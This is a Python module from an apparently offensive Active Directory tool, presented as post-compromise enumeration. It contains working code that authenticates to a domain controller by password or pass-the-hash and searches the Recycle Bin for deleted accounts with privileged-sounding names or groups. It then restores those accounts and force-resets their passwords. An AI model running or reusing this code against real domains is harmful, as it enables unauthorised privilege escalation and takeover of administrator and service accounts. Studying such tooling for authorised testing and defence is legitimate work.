"""Direct LDAP primitives for live AD enumeration (Phase 3C).

Pathstrike's post-compromise enumeration pipeline calls into this module
to query AD state that the bloodyAD/certipy CLI wrappers don't surface
natively — most importantly, the AD Recycle Bin and tombstoned object
reanimation.

All functions here use ``ldap3`` directly (no subprocess) to keep
latency low and control over LDAP controls / extended operations
precise.  ldap3 is already a first-order dependency of the tool stack
(bloodyAD pulls it in); no new runtime requirements.

The primitives are intentionally global — they operate on AD primitives
(``CN=Deleted Objects``, ``msDS-EnabledFeature``, tombstone reanimation
via MODIFYDN + attribute delete) that exist on every Windows 2008 R2+
domain.  The name heuristic in :func:`is_interesting_deleted` is
pattern-based (admin / svc_ / ca_ / operator / ...), not tied to any
specific environment.
"""

from __future__ import annotations

import logging
import re
from typing import Any

try:
    from ldap3 import (
        Connection,
        MODIFY_DELETE,
        NTLM,
        SUBTREE,
        Server,
    )
    from ldap3.core.exceptions import LDAPException
    from ldap3.extend.microsoft.modifyPassword import ad_modify_password
    _LDAP3_AVAILABLE = True
except ImportError:  # pragma: no cover — ldap3 is a hard dep via bloodyAD
    _LDAP3_AVAILABLE = False

logger = logging.getLogger("pathstrike.tools.live_enum")

# LDAP controls we need for deleted-object queries.
#  - 1.2.840.113556.1.4.417 = LDAP_SERVER_SHOW_DELETED_OID
#    ("Show Deleted Objects" — required to see objects in CN=Deleted Objects)
_CONTROL_SHOW_DELETED = ("1.2.840.113556.1.4.417", True, None)


# Pattern-based heuristic for "this deleted account is worth restoring".
# Matches common privileged naming conventions across environments.
# Not exhaustive — pentesters routinely invent their own conventions —
# but catches the typical ~80% of dormant privileged accounts.
_PRIVILEGED_NAME_RE = re.compile(
    r"(?i)(?:admin|svc_|ca_|oper|backup|cert|sql|iis|dba|helpdesk|root|"
    r"domain\s*admin|enterprise|sched|sync|scan|sysnet)"
)

# Privileged group substrings that make a deleted account interesting even
# if its own name doesn't match the pattern (checked against memberOf DNs).
_PRIVILEGED_GROUP_RE = re.compile(
    r"(?i)(?:admin|cert\s*publishers|ca_|operator|domain\s*admin|"
    r"enterprise\s*admin|schema\s*admin|account\s*oper|backup\s*oper)"
)


def ldap3_available() -> bool:
    """Return True if ldap3 is importable in this environment."""
    return _LDAP3_AVAILABLE


# ---------------------------------------------------------------------------
# Connection helper
# ---------------------------------------------------------------------------


def build_ntlm_connection(
    dc_host: str,
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 15,
) -> "Connection | None":
    """Return a bound ldap3 Connection authenticated via NTLM.

    Uses a synchronous bind — fine for our use case (a few queries per
    owned identity).  Pass ``nt_hash`` (32-hex) for pass-the-hash;
    ldap3 accepts the ``aad3b435...:NTHASH`` form as the password.

    Returns ``None`` on bind failure or if ldap3 is missing.
    """
    if not _LDAP3_AVAILABLE:
        logger.debug("ldap3 unavailable; cannot build LDAP connection")
        return None

    if not dc_host or not username:
        return None

    server = Server(dc_host, get_info=None, connect_timeout=timeout)
    user_spec = f"{domain}\\{username}"  # NTLM downlevel form

    if nt_hash:
        ntlm_auth = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
    elif password is not None:
        ntlm_auth = password
    else:
        return None

    try:
        conn = Connection(
            server,
            user=user_spec,
            password=ntlm_auth,
            authentication=NTLM,
            auto_bind=True,
            receive_timeout=timeout,
        )
        return conn
    except LDAPException as exc:
        logger.debug("LDAP bind failed for %s: %s", user_spec, exc)
        return None


def _domain_base_dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split("."))


# ---------------------------------------------------------------------------
# Recycle Bin detection + deleted-object enumeration
# ---------------------------------------------------------------------------


def is_recycle_bin_enabled(conn: "Connection", domain: str) -> bool:
    """Check if the AD Recycle Bin Optional Feature is enabled.

    Looks for the feature GUID in ``msDS-EnabledFeature`` on the
    ``CN=Partitions,CN=Configuration,<domain>`` object.  If the LDAP
    query fails or the feature isn't advertised, returns ``False``
    (the enumeration below still works on tombstoned objects without
    Recycle Bin, but with less attribute preservation).
    """
    base_dn = _domain_base_dn(domain)
    search_base = f"CN=Partitions,CN=Configuration,{base_dn}"
    try:
        conn.search(
            search_base=search_base,
            search_filter="(objectClass=crossRefContainer)",
            search_scope="BASE",
            attributes=["msDS-EnabledFeature"],
        )
    except LDAPException as exc:
        logger.debug("Recycle Bin feature check failed: %s", exc)
        return False

    for entry in getattr(conn, "entries", []):
        try:
            values = entry["msDS-EnabledFeature"].values
        except (KeyError, AttributeError):
            continue
        for v in values:
            # The Recycle Bin feature's known GUID is
            # 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a  —  but names / DNs vary
            # across AD versions.  Substring match is more robust.
            if "Recycle Bin" in str(v) or "766ddcd8" in str(v).lower():
                return True
    return False


def enumerate_deleted_users(
    conn: "Connection", domain: str,
) -> list[dict[str, Any]]:
    """List tombstoned user objects.

    Returns a list of dicts with keys:
      * ``dn`` — the tombstoned distinguishedName (e.g.
        ``CN=cert_admin\\0ADEL:<guid>,CN=Deleted Objects,DC=...``)
      * ``sam`` — sAMAccountName (may be empty if stripped by GC)
      * ``last_known_parent`` — original parent DN for restore
      * ``object_sid`` — string SID
      * ``when_changed`` — deletion timestamp (ISO-ish string)
      * ``member_of`` — list of pre-deletion group DNs (often empty;
        AD strips MemberOf from tombstones unless Recycle Bin is on)

    Returns an empty list on LDAP error.
    """
    base_dn = _domain_base_dn(domain)
    search_base = f"CN=Deleted Objects,{base_dn}"
    try:
        conn.search(
            search_base=search_base,
            search_filter="(&(isDeleted=TRUE)(|(objectClass=user)(objectClass=person)))",
            search_scope=SUBTREE,
            attributes=[
                "sAMAccountName",
                "lastKnownParent",
                "objectSid",
                "whenChanged",
                "memberOf",
                "distinguishedName",
                "name",
            ],
            controls=[_CONTROL_SHOW_DELETED],
        )
    except LDAPException as exc:
        logger.debug("Deleted-objects search failed: %s", exc)
        return []

    results: list[dict[str, Any]] = []
    for entry in getattr(conn, "entries", []):
        def _val(attr_name: str) -> str:
            try:
                v = entry[attr_name].value
            except (KeyError, AttributeError):
                return ""
            return "" if v is None else str(v)

        def _list(attr_name: str) -> list[str]:
            try:
                vs = entry[attr_name].values
            except (KeyError, AttributeError):
                return []
            return [str(v) for v in vs if v is not None]

        results.append({
            "dn": str(entry.entry_dn),
            "sam": _val("sAMAccountName"),
            "name": _val("name"),
            "last_known_parent": _val("lastKnownParent"),
            "object_sid": _val("objectSid"),
            "when_changed": _val("whenChanged"),
            "member_of": _list("memberOf"),
        })
    return results


def is_interesting_deleted(account: dict[str, Any]) -> bool:
    """Heuristic: is this deleted account a realistic escalation candidate?

    Rules (any one matches = interesting):
      * sAMAccountName or CN matches privileged-name patterns
      * Account was a member of an admin-sounding group before deletion
      * Last-known-parent was a privileged OU (contains "admin" / "tier0" / ...)
    """
    sam = (account.get("sam") or account.get("name") or "").strip()
    if sam and _PRIVILEGED_NAME_RE.search(sam):
        return True

    for group_dn in account.get("member_of") or []:
        if _PRIVILEGED_GROUP_RE.search(group_dn):
            return True

    parent = account.get("last_known_parent") or ""
    if parent and _PRIVILEGED_NAME_RE.search(parent):
        return True

    return False


# ---------------------------------------------------------------------------
# Tombstone reanimation + password reset
# ---------------------------------------------------------------------------


def restore_deleted_object(
    conn: "Connection",
    deleted_dn: str,
    sam_account_name: str,
    last_known_parent: str,
) -> tuple[bool, str, str]:
    """Reanimate a tombstoned object back to its prior OU.

    Performs the standard tombstone restore: MODIFYDN moves the object
    out of ``CN=Deleted Objects`` into ``last_known_parent`` with
    ``CN=<sam>``, then deletes the ``isDeleted`` attribute to make it a
    live object again.

    Returns ``(success, message, restored_dn)``.  ``restored_dn`` is
    empty on failure.
    """
    if not _LDAP3_AVAILABLE:
        return False, "ldap3 not available", ""

    if not deleted_dn or not sam_account_name or not last_known_parent:
        return False, "Missing DN / sAMAccountName / lastKnownParent", ""

    new_rdn = f"CN={sam_account_name}"
    try:
        ok = conn.modify_dn(
            dn=deleted_dn,
            relative_dn=new_rdn,
            new_superior=last_known_parent,
            controls=[_CONTROL_SHOW_DELETED],
        )
        if not ok:
            return (
                False,
                f"MODIFYDN failed: {conn.result.get('description', 'unknown')}",
                "",
            )
    except LDAPException as exc:
        return False, f"MODIFYDN exception: {exc}", ""

    restored_dn = f"{new_rdn},{last_known_parent}"

    # Second step: remove the isDeleted attribute.  Some AD versions do
    # this implicitly during MODIFYDN out of Deleted Objects, but issuing
    # the explicit delete is idempotent and safe.
    try:
        ok = conn.modify(
            restored_dn,
            {"isDeleted": [(MODIFY_DELETE, [])]},
        )
        # Ignore the return — some servers reject "no such attribute"
        # when MODIFYDN already cleared it, which is fine.
    except LDAPException as exc:
        logger.debug(
            "isDeleted removal after MODIFYDN had an error (usually harmless): %s",
            exc,
        )

    return True, f"Restored to {restored_dn}", restored_dn


def set_user_password(
    conn: "Connection",
    target_dn: str,
    new_password: str,
) -> tuple[bool, str]:
    """Force-set a user's password via the Microsoft-specific LDAP extended op.

    Requires the ``User-Force-Change-Password`` extended right on the
    target — usually granted to whoever has `GenericAll` / `Owns` /
    `WriteDacl` on the object.  Since we just restored a tombstoned
    object, we typically have those rights.
    """
    if not _LDAP3_AVAILABLE:
        return False, "ldap3 not available"

    try:
        ok = ad_modify_password(conn, target_dn, new_password, old_password=None)
        if not ok:
            desc = conn.result.get("description", "unknown")
            return False, f"ad_modify_password failed: {desc}"
    except LDAPException as exc:
        return False, f"Password set exception: {exc}"
    return True, f"Password set for {target_dn}"
